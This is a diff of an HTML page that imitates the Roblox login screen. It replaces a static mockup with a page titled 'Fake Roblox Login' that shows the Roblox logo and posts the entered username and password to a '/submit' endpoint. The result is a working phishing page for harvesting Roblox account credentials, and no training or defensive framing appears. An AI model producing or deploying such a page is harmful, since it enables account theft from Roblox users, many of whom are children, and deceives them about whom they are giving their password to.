@@ -1,33 +1,19 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Login - Roblox</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Fake Roblox Login</title>
   <link rel="stylesheet" href="style.css" />
-  <link rel="icon" href="favicon.png" type="image/png" />
 </head>
 <body>
-  <div class="navbar">
-    <div class="logo">
-      <img src="roblox-logo.png" alt="Roblox Logo" class="roblox-logo" />
-    </div>
-    <div class="nav-links">
-      <a>Discover</a>
-      <a>Avatar Shop</a>
-      <a>Create</a>
-      <a>Robux</a>
-    </div>
-  </div>
-  <div class="login-box">
-    <img src="avatar.png" class="avatar" />
-    <h2>Login to Roblox</h2>
-    <input type="text" placeholder="Username/Email/Phone" />
-    <input type="password" placeholder="Password" />
-    <button class="login-btn">Login</button>
-    <button class="alt-btn">Login with another device</button>
-    <a class="signup">Sign Up</a>
+  <div class="login-container">
+    <img src="roblox-logo.png" alt="Roblox Logo" />
+    <form action="/submit" method="POST">
+      <input type="text" name="username" placeholder="Username" required />
+      <input type="password" name="password" placeholder="Password" required />
+      <button type="submit">Log In</button>
+    </form>
   </div>
 </body>
 </html>
